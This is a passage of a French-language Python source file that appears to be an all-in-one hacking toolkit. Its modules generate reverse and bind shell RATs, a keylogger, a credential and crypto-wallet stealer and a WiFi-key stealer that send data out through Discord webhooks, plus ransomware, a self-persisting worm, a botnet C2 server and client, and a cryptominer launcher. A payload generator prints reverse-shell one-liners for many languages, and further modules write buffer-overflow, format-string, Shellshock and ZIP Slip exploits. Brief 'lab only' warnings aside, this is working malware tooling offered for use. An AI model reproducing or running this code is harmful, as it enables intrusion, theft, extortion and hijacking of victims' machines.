                            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "MediaService", 0, winreg.REG_SZ, cible)
    except Exception:
        pass

if __name__ == "__main__":
    persister()
    while True:
        time.sleep(3600)
'''


# ============================================================================
#  MODULES 1-10  (PAGE 1 - Network)
# ============================================================================

def mod_01():  # Rat Creator
    outil_titre("Rat Creator")
    info("Type de RAT a generer :")
    print(f"  {RED}[1]{RESET} Reverse shell Python (Windows)")
    print(f"  {RED}[2]{RESET} Reverse shell Bash (Linux/Unix)")
    print(f"  {RED}[3]{RESET} Bind shell Python (ecoute locale)")
    typ = ask_int("Ton choix (1-3) : ", 1)
    host = ask("IP du listener (reverse) ou IP publique (bind) : ", "127.0.0.1")
    port = ask_int("Port : ", 4444)
    if typ == 2:
        tpl, ext = TPL_REVERSE_BASH, ".sh"
    elif typ == 3:
        tpl, ext = TPL_BIND_PY, ".py"
    else:
        tpl, ext = TPL_REVERSE_PY, ".py"
    nom = "rat_" + time.strftime("%H%M%S") + ext
    code = render(tpl, {"HOST": host, "PORT": port})
    chemin = chemin_out(nom)
    ecrire_fichier(chemin, code)
    ok(f"Payload genere : {chemin}")
    if typ in (1, 2):
        info(f"Ecoute en attente : nc -lvnp {port}")
    else:
        info(f"Sur la cible : nc {host} {port}")
    info("Compilation exe : pyinstaller --onefile --noconsole " + chemin)
    pause()


def mod_02():  # Keylogger Build
    outil_titre("Keylogger Build")
    info("Keylogger Windows sans dependance (ctypes GetAsyncKeyState).")
    webhook = ask("Webhook exfiltration (Discord/Telegram) [vide = local] : ", API_KEYS.get("discord_webhook", ""))
    nom = "keylogger_" + time.strftime("%H%M%S") + ".py"
    code = render(TPL_KEYLOGGER, {"WEBHOOK": webhook})
    chemin = chemin_out(nom)
    ecrire_fichier(chemin, code)
    ok(f"Keylogger genere : {chemin}")
    info("Logs ecrits dans %APPDATA%\\system_logs.txt toutes les 30 s.")
    info("Compilation : pyinstaller --onefile --noconsole " + chemin)
    pause()


def mod_03():  # Stealer Build
    outil_titre("Stealer Build")
    info("Stealer Windows : navigateurs (copies Login Data/Cookies/extension), tokens Discord, wallets, wifi.")
    webhook = ask("Webhook d'exfiltration (Discord) [vide = fichier local] : ", API_KEYS.get("discord_webhook", ""))
    nom = "stealer_" + time.strftime("%H%M%S") + ".py"
    code = render(TPL_STEALER, {"WEBHOOK": webhook})
    chemin = chemin_out(nom)
    ecrire_fichier(chemin, code)
    ok(f"Stealer genere : {chemin}")
    warn("Base exportee brute (sans decryptage AES-GCM) : a analyser hors-ligne avec un decrypteur DPAPI.")
    info("Compilation : pyinstaller --onefile --noconsole --add-data pas necessaire " + chemin)
    pause()


def mod_04():  # Ransomware Build
    outil_titre("Ransomware Build")
    warn("A UTILISER UNIQUEMENT EN LABO SUR DES FICHIERS DE TEST.")
    dossier = ask("Repertoire cible (defaut : Documents\\test_labo) : ", os.path.join(os.path.expanduser("~"), "Documents", "test_labo"))
    dossier = os.path.expanduser(dossier)
    contact = ask("Message de contact (email/telegram) : ", "admin@example.com")
    webhook = ask("Webhook pour recevoir la cle [vide = cle locale] : ", API_KEYS.get("discord_webhook", ""))
    os.makedirs(dossier, exist_ok=True)
    code = render(TPL_RANSOM, {"DIR": dossier.replace("\\", "\\\\"), "WEBHOOK": webhook, "CONTACT": contact})
    nom = "ransom_" + time.strftime("%H%M%S") + ".py"
    chemin = chemin_out(nom)
    ecrire_fichier(chemin, code)
    ok(f"Ransomware genere : {chemin}")
    info("Sur la machine de test : python " + chemin)
    warn("Conserve une copie des fichiers de test AVANT execution (chiffrement Fernet).")
    pause()


def mod_05():  # Wifi Stealer Build
    outil_titre("Wifi Stealer Build")
    info("Exfiltre toutes les clefs WiFi (netsh key=clear) de la machine cible.")
    webhook = ask("Webhook d'exfiltration [vide = fichier local] : ", API_KEYS.get("discord_webhook", ""))
    nom = "wifi_stealer_" + time.strftime("%H%M%S") + ".py"
    code = render(TPL_WIFI, {"WEBHOOK": webhook})
    chemin = chemin_out(nom)
    ecrire_fichier(chemin, code)
    ok(f"Wifi stealer genere : {chemin}")
    info("Necessite les droits administrateur sur la cible pour lire les clefs.")
    pause()


def mod_06():  # Virus Build
    outil_titre("Virus Build")
    info("Demo de propagation : copie de soi-meme + persistance HKCU\\Run.")
    nom = "virus_demo_" + time.strftime("%H%M%S") + ".py"
    chemin = chemin_out(nom)
    ecrire_fichier(chemin, TPL_WORM)
    ok(f"Demo virus generee : {chemin}")
    warn("Comportement : copie dans %TEMP% + cle Run 'MediaService'. Supprimer la cle pour nettoyer.")
    pause()


def mod_07():  # Botnet Builder
    outil_titre("Botnet Builder")
    info("Genere un mini-C2 (serveur + client beacon) en Python pur.")
    host = ask("IP/domaine du serveur C2 : ", "127.0.0.1")
    port = ask_int("Port du C2 : ", 9999)
    dossier = chemin_out("botnet_c2")
    os.makedirs(dossier, exist_ok=True)

    tpl_client = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Bot client genere par MyTool
import socket, subprocess, os, time, json, platform, uuid

HOST = "@@HOST@@"
PORT = @@PORT@@
ID = socket.gethostname() + "-" + uuid.uuid4().hex[:6]

def envoi(s, d):
    data = json.dumps(d).encode("utf-8")
    s.sendall(len(data).to_bytes(4, "big") + data)

def recv(s):
    h = s.recv(4)
    if not h:
        return None
    n = int.from_bytes(h, "big")
    buf = b""
    while len(buf) < n:
        c = s.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return json.loads(buf.decode("utf-8", "ignore"))

def boucle():
    while True:
        try:
            s = socket.create_connection((HOST, PORT), timeout=12)
            envoi(s, {"type": "hello", "id": ID, "os": platform.platform()})
            while True:
                m = recv(s)
                if not m:
                    break
                if m.get("type") == "cmd":
                    try:
                        r = subprocess.run(m["cmd"], shell=True, capture_output=True,
                                           text=True, timeout=int(m.get("timeout", 30)))
                        out = (r.stdout or "") + (r.stderr or "")
                    except Exception as e:
                        out = "[erreur] " + str(e)
                    envoi(s, {"type": "result", "id": ID, "data": out})
        except Exception:
            pass
        time.sleep(10)

if __name__ == "__main__":
    boucle()
'''
    tpl_server = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# C2 server genere par MyTool - console de controle
import socket, json, threading

PORT = @@PORT@@
sessions = {}          # id -> socket
verrou = threading.Lock()

def envoi(s, d):
    data = json.dumps(d).encode("utf-8")
    s.sendall(len(data).to_bytes(4, "big") + data)

def recv(s):
    h = s.recv(4)
    if not h:
        return None
    n = int.from_bytes(h, "big")
    buf = b""
    while len(buf) < n:
        c = s.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return json.loads(buf.decode("utf-8", "ignore"))

def gerer(conn, addr):
    try:
        while True:
            m = recv(conn)
            if not m:
                break
            if m.get("type") == "hello":
                with verrou:
                    sessions[m["id"]] = conn
                print("[+] Nouveau bot :", m["id"], "|", m.get("os", ""), "|", addr)
            elif m.get("type") == "result":
                print("[<]", m.get("id"))
                print(m.get("data", ""))
    except Exception:
        pass
    finally:
        with verrou:
            for k, v in list(sessions.items()):
                if v is conn:
                    del sessions[k]
        try:
            conn.close()
        except Exception:
            pass

def console():
    while True:
        try:
            cmd = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd:
            continue
        if cmd in ("quit", "exit"):
            break
        if cmd == "sessions":
            with verrou:
                if not sessions:
                    print("(aucun bot)")
                for k in sessions:
                    print(" -", k)
            continue
        if cmd.startswith("exec "):
            reste = cmd[5:].split(" ", 1)
            bid = reste[0]
            commande = reste[1] if len(reste) > 1 else ""
            with verrou:
                s = sessions.get(bid)
            if not s:
                print("Bot inconnu :", bid)
            else:
                try:
                    envoi(s, {"type": "cmd", "cmd": commande, "timeout": 30})
                except Exception as e:
                    print("Erreur :", e)
            continue
        print("Commandes : sessions | exec <id> <cmd> | quit")

if __name__ == "__main__":
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(50)
    print("[*] C2 en ecoute sur 0.0.0.0:%d" % PORT)
    threading.Thread(target=console, daemon=True).start()
    while True:
        try:
            c, a = srv.accept()
            threading.Thread(target=gerer, args=(c, a), daemon=True).start()
        except KeyboardInterrupt:
            break
'''
    ecrire_fichier(os.path.join(dossier, "c2_client.py"), render(tpl_client, {"HOST": host, "PORT": port}))
    ecrire_fichier(os.path.join(dossier, "c2_server.py"), render(tpl_server, {"PORT": port}))
    ok(f"Botnet genere dans {dossier}")
    info("1) Lance le serveur : python generated/botnet_c2/c2_server.py")
    info("2) Distribue le client sur les machines cibles.")
    pause()


def mod_08():  # Remote Shell
    outil_titre("Remote Shell")

    def interactif(sock, cote):
        def rx():
            try:
                while True:
                    d = sock.recv(4096)
                    if not d:
                        break
                    sys.stdout.write(d.decode("utf-8", "ignore"))
                    sys.stdout.flush()
            except Exception:
                pass
            print("\n[!] Connexion fermee.")

        threading.Thread(target=rx, daemon=True).start()
        info("Shell interactif. Tape 'exit' pour fermer, Ctrl+C pour quitter.")
        try:
            while True:
                cmd = input(f"{RED}[shell@{cote}]{RESET} # ")
                if cmd.lower() in ("exit", "quit"):
                    break
                try:
                    sock.send((cmd + "\n").encode("utf-8"))
                except Exception as e:
                    erreur(str(e))
                    break
        except (KeyboardInterrupt, EOFError):
            pass
        try:
            sock.close()
        except Exception:
            pass

    print(f"  {RED}[1]{RESET} Mode listener (bind) - attend une connexion entrante")
    print(f"  {RED}[2]{RESET} Mode connect - se connecte a un bind shell distant")
    mode = ask_int("Ton choix (1-2) : ", 1)
    port = ask_int("Port : ", 4444)
    if mode == 2:
        cible = ask("Adresse cible : ", "127.0.0.1")
        try:
            s = socket.create_connection((cible, port), timeout=8)
            ok("Connecte a " + cible + ":" + str(port))
            interactif(s, cible)
        except Exception as e:
            erreur("Connexion impossible : " + str(e))
    else:
        try:
            srv = socket.socket()
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(1)
            info(f"En ecoute sur 0.0.0.0:{port} - en attente d'une connexion...")
            c, addr = srv.accept()
            ok("Connexion recue de " + str(addr))
            interactif(c, str(addr[0]))
            srv.close()
        except Exception as e:
            erreur(str(e))
    pause()


def mod_09():  # Proxy Manager
    outil_titre("Proxy Manager")
    info("Recupere une liste de proxies publics puis teste leur fonctionnement.")
    limite = ask_int("Nombre max de proxies a tester (defaut 40) : ", 40)
    liste_urls = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    ]
    proxies = []
    for url in liste_urls:
        txt = http_get(url, timeout=20)
        if txt:
            proxies += [l.strip() for l in txt.splitlines() if re.fullmatch(r"[\d.]+:\d+", l.strip())]
        if len(proxies) >= 200:
            break
    proxies = list(dict.fromkeys(proxies))
    if not proxies:
        erreur("Aucune liste accessible. Verifie ta connexion.")
        pause()
        return
    ok(f"{len(proxies)} proxies trouves, test de {min(limite, len(proxies))}...")

    def test_px(px):
        try:
            ph = urllib.request.ProxyHandler({"http": "http://" + px, "https": "http://" + px})
            op = urllib.request.build_opener(ph)
            t = time.time()
            op.open("http://api.ipify.org", timeout=6)
            return (px, round((time.time() - t) * 1000))
        except Exception:
            return (px, None)

    valides = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for px, ms in ex.map(test_px, random.sample(proxies, min(limite, len(proxies)))):
            if ms is not None:
                valides.append((px, ms))
                print(f"  {GREEN}[OK]{RESET} {px}  ({ms} ms)")
    valides.sort(key=lambda x: x[1])
    ok(f"{len(valides)} proxies fonctionnels")
    if valides:
        sauvegarde = oui_non("Sauvegarder la liste valide ?", True)
        if sauvegarde:
            chemin = chemin_out("proxies_valides.txt")
            ecrire_fichier(chemin, "\n".join(px for px, _ in valides) + "\n")
            ok("Liste sauvegardee : " + chemin)
    pause()


def mod_10():  # Network Recon
    outil_titre("Network Recon")
    try:
        s_tmp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_tmp.connect(("8.8.8.8", 80))
        ip_locale = s_tmp.getsockname()[0]
        s_tmp.close()
    except Exception:
        ip_locale = "127.0.0.1"
    info("IP locale : " + ip_locale)

    cible = ask("IP a scanner (Entree = scan du sous-reseau local) : ", "")
    if not cible:
        info("Recuperation de la table ARP locale...")
        try:
            p = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            hotes = set(re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+[0-9a-f-]{17}", p.stdout))
            hotes.discard("224.0.0.0")
            hotes.discard("255.255.255.255")
        except Exception:
            hotes = set()
        if not hotes:
            base = ".".join(ip_locale.split(".")[:3])
            hotes = {base + "." + str(i) for i in range(1, 30)}
        warn(f"{len(hotes)} hotes dans la table ARP, scan des ports communs...")
    else:
        hotes = {cible}

    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 27017]
    resultats = {}

    def scan_hote(h):
        ouverts = scan_ports(h, ports, timeout=0.7)
        return h, ouverts

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for h, ouverts in ex.map(scan_hote, list(hotes)):
            if ouverts:
                resultats[h] = ouverts
                print(f"  {GREEN}{h}{RESET} : {', '.join(str(p) for p in ouverts)}")

    if resultats:
        sauvegarde = oui_non("Sauvegarder le rapport ?", True)
        if sauvegarde:
            rapport = [f"Cible : {cible or 'local'} | {time.ctime()}", ""]
            for h, ouverts in sorted(resultats.items()):
                rapport.append(h + " : " + ", ".join(str(p) for p in ouverts))
            chemin = chemin_out("recon_reseau_" + time.strftime("%H%M%S") + ".txt")
            ecrire_fichier(chemin, "\n".join(rapport) + "\n")
            ok("Rapport : " + chemin)
    else:
        warn("Aucun port ouvert detecte sur les hotes testes.")
    pause()


# ============================================================================
#  HELPERS SUPPLEMENTAIRES (saisie multiligne, entropie, taille)
# ============================================================================

def lire_multiligne(invite):
    print(f"{GREY}{invite}{RESET}")
    lignes = []
    while True:
        try:
            ligne = input()
        except EOFError:
            break
        if ligne.strip() == "":
            if lignes:
                break
            continue
        lignes.append(ligne)
    return "\n".join(lignes)


def taille_humaine(n):
    for unite in ("o", "Ko", "Mo", "Go", "To"):
        if n < 1024:
            return f"{n:.1f} {unite}"
        n /= 1024
    return f"{n:.1f} Po"


def entropie(data):
    if not data:
        return 0.0
    from collections import Counter
    c = Counter(data)
    n = len(data)
    return -sum((k / n) * math.log2(k / n) for k in c.values())


# ============================================================================
#  MODULES 11-20  (PAGE 1 - Utilities)
# ============================================================================

def mod_11():  # Crypto Miner Build
    outil_titre("Crypto Miner Build")
    info("Genere la config xmrig + script de lancement (CPU).")
    info("Serveurs de pool publics (defaut hashvault) - utilise une adresse valide.")
    pool = ask("Adresse du pool :port : ", "pool.hashvault.pro:443")
    wallet = ask("Adresse du wallet (XMR) : ", "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A")
    worker = ask("Nom du worker : ", socket.gethostname())
    threads = ask_int("Threads CPU (0 = auto) : ", 0)

    config = {
        "autosave": True,
        "cpu": {"enabled": True, "max-threads-hint": 100 if threads == 0 else threads},
        "donate-level": 1,
        "log-file": "xmrig.log",
        "pools": [{
            "url": pool,
            "user": wallet,
            "pass": worker,
            "tls": True,
            "keepalive": True,
        }],
        "randomx": {"mode": "auto", "1gb-pages": False},
    }
    dossier = chemin_out("miner_build")
    os.makedirs(dossier, exist_ok=True)
    ecrire_fichier(os.path.join(dossier, "config.json"), json.dumps(config, indent=2))

    tpl_run = '''@echo off
rem Lanceur xmrig - MyTool
where xmrig >nul 2>nul
if %errorlevel%==0 (
    xmrig -c config.json
    goto fin
)
echo [!] xmrig introuvable - tentative de telechargement...
powershell -Command "$r=Invoke-RestMethod https://api.github.com/repos/xmrig/xmrig/releases/latest; $a=$r.assets | Where-Object {$_.name -match 'win64.*zip' -or $_.name -match 'win64-cuda' -and $_.name -match 'zip'} | Select-Object -First 1; if(-not $a){$a=$r.assets | Where-Object {$_.name -match 'win64'} | Select-Object -First 1}; Invoke-WebRequest $a.browser_download_url -OutFile xmrig.zip; Expand-Archive xmrig.zip -Force; Get-ChildItem -Recurse xmrig.exe | Select-Object -First 1 | ForEach-Object { $_.FullName } > xmrig_path.txt"
for /f %%i in (xmrig_path.txt) do set XR=%%i
if defined XR (
    "%XR%" -c config.json
) else (
    echo [x] Telechargement manuel requis : https://github.com/xmrig/xmrig/releases
)
:fin
pause
'''
    ecrire_fichier(os.path.join(dossier, "start_miner.bat"), tpl_run)
    ok(f"Build genere dans {dossier}/")
    info("1) Decompresse xmrig dans ce dossier OU lance start_miner.bat (auto-download).")
    info("2) Edite config.json si besoin (algo auto, pool/wallet deja inseres).")
    pause()


def mod_12():  # Password Generator
    outil_titre("Password Generator")
    longueur = ask_int("Longueur du mot de passe : ", 16)
    nombre = ask_int("Combien en generer : ", 5)
    minuscules = oui_non("Lettres minuscules ?", True)
    majuscules = oui_non("Lettres majuscules ?", True)
    chiffres = oui_non("Chiffres ?", True)
    symboles = oui_non("Symboles ?", True)
    ambigus = ask("Exclure les caracteres ambigus (0O1lI|) ? [Y/n] ", "y").lower() in ("y", "yes", "oui", "o", "")

    jeux = ""
    if minuscules:
        jeux += "abcdefghijklmnopqrstuvwxyz"
    if majuscules:
        jeux += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if chiffres:
        jeux += "0123456789"
    if symboles:
        jeux += "!@#$%^&*()-_=+[]{};:,.<>?/~"
    if ambigus:
        for c in "0O1lI|":
            jeux = jeux.replace(c, "")
    if not jeux:
        erreur("Aucun jeu de caracteres selectionne.")
        pause()
        return

    liste = []
    for _ in range(nombre):
        mdp = "".join(random.choice(jeux) for _ in range(longueur))
        # garantit au moins un caractere de chaque jeu choisi
        while True:
            ok_jeux = True
            for jeu in (("abcdefghijklmnopqrstuvwxyz" if minuscules else ""),
                        ("ABCDEFGHIJKLMNOPQRSTUVWXYZ" if majuscules else ""),
                        ("0123456789" if chiffres else ""),
                        ("!@#$%^&*()-_=+[]{};:,.<>?/~" if symboles else "")):
                if jeu and not any(c in jeu for c in mdp):
                    ok_jeux = False
                    break
            if ok_jeux:
                break
            mdp = "".join(random.choice(jeux) for _ in range(longueur))
        liste.append(mdp)

    ligne_separation()
    for i, mdp in enumerate(liste, 1):
        print(f"  {RED}[{i:02}]{RESET} {WHITE}{mdp}{RESET}")
    ligne_separation()
    info(f"Longueur : {longueur} | Entropie approx. : {int(longueur * math.log2(len(jeux)))} bits")

    if oui_non("Sauvegarder dans un fichier ?", False):
        chemin = chemin_out("passwords_" + time.strftime("%H%M%S") + ".txt")
        ecrire_fichier(chemin, "\n".join(liste) + "\n")
        ok("Fichier : " + chemin)
    pause()


def mod_13():  # Hash Identifier
    outil_titre("Hash Identifier")
    print(f"  {RED}[1]{RESET} Identifier un hash")
    print(f"  {RED}[2]{RESET} Calculer les hashs d'une chaine")
    mode = ask_int("Ton choix (1-2) : ", 1)

    REGLES = [
        ("MD5",            r"^[a-fA-F0-9]{32}$"),
        ("SHA-1",          r"^[a-fA-F0-9]{40}$"),
        ("SHA-256",        r"^[a-fA-F0-9]{64}$"),
        ("SHA-384",        r"^[a-fA-F0-9]{96}$"),
        ("SHA-512",        r"^[a-fA-F0-9]{128}$"),
        ("NTLM",           r"^[a-fA-F0-9]{32}$"),
        ("MySQL 4.1+",     r"^\*[a-fA-F0-9]{40}$"),
        ("bcrypt ($2a$)",  r"^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$"),
        ("bcrypt ($2b$)",  r"^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$"),
        ("sha512crypt",    r"^\$6\$[^:]{0,16}\$[./A-Za-z0-9]{86}$"),
        ("sha256crypt",    r"^\$5\$[^:]{0,16}\$[./A-Za-z0-9]{43}$"),
        ("md5crypt",       r"^\$1\$[^:]{0,16}\$[./A-Za-z0-9]{22}$"),
        ("Argon2",         r"^\$argon2(id|i|d)\$"),
        ("JWT (header)",   r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$"),
        ("RIPEMD-160",     r"^[a-fA-F0-9]{40}$"),
        ("Whirlpool",      r"^[a-fA-F0-9]{128}$"),
        ("GOST",           r"^[a-fA-F0-9]{64}$"),
        ("CRC32 (hex)",    r"^[a-fA-F0-9]{8}$"),
    ]

    if mode == 1:
        valeur = ask("Hash a identifier : ", "")
        if not valeur:
            erreur("Saisie vide.")
            pause()
            return
        print()
        trouve = []
        for nom, pat in REGLES:
            if re.fullmatch(pat, valeur):
                trouve.append(nom)
                print(f"  {GREEN}->{RESET} Possible : {WHITE}{nom}{RESET}")
        if not trouve:
            longueur = len(valeur)
            hexa = re.fullmatch(r"[a-fA-F0-9]+", valeur) is not None
            print(f"  {RED}->{RESET} Aucune correspondance exacte.")
            info(f"Longueur : {longueur} | Hexa : {'oui' if hexa else 'non'}")
            info("Cela ressemble a : " + ("un hash (longueur inconnue ou sel/prepend)" if hexa else "base64 / token / donnee chiffree"))
            # tentatives base64
            try:
                dec = base64.b64decode(valeur + "=" * (-len(valeur) % 4))
                if dec:
                    print(f"  {YELLOW}[i]{RESET} Decode base64 : {dec[:200]}")
            except Exception:
                pass
        pause()
        return

    texte = ask("Chaine a hasher : ", "")
    print()
    for nom in ("md5", "sha1", "sha256", "sha512"):
        h = hashlib.new(nom)
        h.update(texte.encode("utf-8"))
        print(f"  {WHITE}{nom.upper():8}{RESET} {h.hexdigest()}")
    try:
        print(f"  {WHITE}{'NTLM':8}{RESET} " + hashlib.new("md4", texte.encode("utf-16le")).hexdigest())
    except Exception:
        pass
    pause()


def mod_14():  # Payload Generator
    outil_titre("Payload Generator")
    info("Genere des one-liners de reverse shell (utilisation : lab uniquement).")
    print()
    print(f"  {RED}[1]{RESET} Bash")
    print(f"  {RED}[2]{RESET} Python")
    print(f"  {RED}[3]{RESET} PowerShell (base64)")
    print(f"  {RED}[4]{RESET} Netcat")
    print(f"  {RED}[5]{RESET} PHP")
    print(f"  {RED}[6]{RESET} Perl")
    print(f"  {RED}[7]{RESET} Ruby")
    print(f"  {RED}[8]{RESET} Socat")
    print(f"  {RED}[9]{RESET} Tous + commande msfvenom")
    typ = ask_int("Ton choix (1-9) : ", 9)
    lhost = ask("LHOST (ton IP) : ", ip_publique() or "127.0.0.1")
    lport = ask_int("LPORT : ", 4444)

    resultats = []
    if typ in (1, 9):
        resultats.append(("bash.txt", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"))
    if typ in (2, 9):
        resultats.append(("python.txt",
                          f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'\n'))
    if typ in (3, 9):
        ps = f'$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length)}}'
        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
        resultats.append(("powershell.txt", f"powershell -nop -w hidden -enc {b64}\n"))
    if typ in (4, 9):
        resultats.append(("netcat.txt", f"nc -e /bin/sh {lhost} {lport}\n"))
    if typ in (5, 9):
        resultats.append(("php.txt", f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'\n'))
    if typ in (6, 9):
        resultats.append(("perl.txt",
                          f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'\n'))
    if typ in (7, 9):
        resultats.append(("ruby.txt",
                          f'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'\n'))
    if typ in (8, 9):
        resultats.append(("socat.txt", f"socat TCP:{lhost}:{lport} EXEC:/bin/sh,pipes\n"))

    ligne_separation()
    for nom, contenu in resultats:
        print(f"{YELLOW}--- {nom} ---{RESET}")
        print(contenu, end="")
    ligne_separation()

    if typ in (1, 2, 3, 4, 5, 6, 7, 8):
        ok(f"Payload sauvegarde : {chemin_out(resultats[0][0])}")
        ecrire_fichier(chemin_out(resultats[0][0]), resultats[0][1])
    elif typ == 9:
        for nom, contenu in resultats:
            ecrire_fichier(chemin_out(nom), contenu)
        msf = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe"
        info("Commande msfvenom : " + msf)
        ok("Payloads sauvegardes dans generated/")
    info("Ecoute : nc -lvnp " + str(lport))
    pause()


def mod_15():  # Exploit Builder
    outil_titre("Exploit Builder")
    warn("Squelettes d'exploitation pour machines de labo (vulnserver / DVWA / cibles autorisees).")
    print()
    print(f"  {RED}[1]{RESET} Buffer overflow Python (modele vulnserver EIP)")
    print(f"  {RED}[2]{RESET} Lecteur format string (modele 32 bits)")
    print(f"  {RED}[3]{RESET} PoC Shellshock (CGI)")
    print(f"  {RED}[4]{RESET} PoC ZIP Slip (genere une archive malformee)")
    typ = ask_int("Ton choix (1-4) : ", 1)

    if typ == 1:
        host = ask("IP de la cible (labo) : ", "127.0.0.1")
        port = ask_int("Port : ", 9999)
        code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Buffer overflow skeleton - vulnserver TRUN (labo)
# Etape 1 : trouver l'offset avec pattern_create/pattern_offset (msf-pattern)
# Etape 2 : verifier le controle de EIP avec 4 B
# Etape 3 : badchars (\\x00\\x0a\\x0d...)
# Etape 4 : msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -b "\\x00" -f c
import socket, struct, sys

IP = "{host}"
PORT = {port}
OFFSET = 2003        # a ajuster avec pattern_offset
RET = 0x625011AF     # a ajuster (module sans ASLR, !mona modules)
EIP = struct.pack("<I", RET)

# shellcode = b"\\xfc\\x..."  # insere ici ton shellcode msfvenom
# nopsled = b"\\x90" * 32
payload = b"A" * OFFSET + EIP  # + nopsled + shellcode

s = socket.socket()
s.connect((IP, PORT))
s.recv(1024)
s.send(b"TRUN ." + payload + b"\\r\\n")
s.close()
print("[+] Payload envoye:", len(payload), "octets")
'''
        chemin = chemin_out("exploit_bof_" + time.strftime("%H%M%S") + ".py")
        ecrire_fichier(chemin, code)
        ok("Exploit genere : " + chemin)
    elif typ == 2:
        code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Format string reader - 32 bits (labo)
# Usage: adapter le format et l'offset (%%n$p) a la binaire cible
import socket

IP = "{ask('IP de la cible (labo) : ', '127.0.0.1')}"
PORT = {ask_int('Port : ', 9999)}

def leak(spec):
    s = socket.socket()
    s.connect((IP, PORT))
    s.recv(1024)
    s.send((spec + "\\n").encode())
    s.settimeout(2)
    try:
        data = s.recv(4096)
    except Exception:
        data = b""
    s.close()
    return data

for i in range(1, 20):
    spec = "AAAA.%{i}$p.%{i}$x"
    rep = leak(spec)
    print(f"[offset {{i}}] {{rep}}")
'''
        chemin = chemin_out("exploit_fmtstr_" + time.strftime("%H%M%S") + ".py")
        ecrire_fichier(chemin, code)
        ok("Exploit genere : " + chemin)
    elif typ == 3:
        cible = ask("URL CGI cible (ex: http://IP/cgi-bin/test.cgi) : ", "http://127.0.0.1/cgi-bin/test.cgi")
        lhost = ask("Ton IP (LHOST) : ", "127.0.0.1")
        lport = ask_int("Ton port (LPORT) : ", 4444)
        code = f'''#!/bin/bash
# Shellshock PoC (CVE-2014-6271) - cible labo
curl -H "User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" \\
  {cible}
'''
        chemin = chemin_out("shellshock_poc.sh")
        ecrire_fichier(chemin, code)
        ok("PoC genere : " + chemin)
    elif typ == 4:
        contenu = ask("Contenu du fichier a extraire (payload) : ", "pwned")
        cible_zip = ask("Chemin de sortie dans l'archive (ex: ../../tmp/pwn.txt) : ", "../../tmp/pwn.txt")
        archive = chemin_out("ziplip_demo.zip")
        import zipfile as zf
        import io as _io
        info_bytes = _io.BytesIO(contenu.encode())
        with zf.ZipFile(archive, "w") as z:
            zi = zf.ZipInfo(cible_zip)
            z.writestr(zi, contenu)
        ok("Archive malformee : " + archive)
        info("A extraire avec un extracteur NON protege dans un bac a sable.")
    pause()


def mod_16():  # Json Formatter
    outil_titre("Json Formatter")
    texte = lire_multiligne("Colle ton JSON puis valide avec une ligne vide :")
    if not texte.strip():
        erreur("Saisie vide.")
        pause()
        return
    try:
        data = json.loads(texte)
    except Exception as e:
        erreur("JSON invalide : " + str(e))
        pause()
        return
    ok("JSON valide.")
    print(f"  Type racine : {type(data).__name__}")
    if isinstance(data, dict):
        info(f"{len(data)} cle(s) : {', '.join(list(data.keys())[:10])}")
    elif isinstance(data, list):
        info(f"Liste de {len(data)} element(s)")

    print()
    print(f"  {RED}[1]{RESET} Pretty print (indente)")
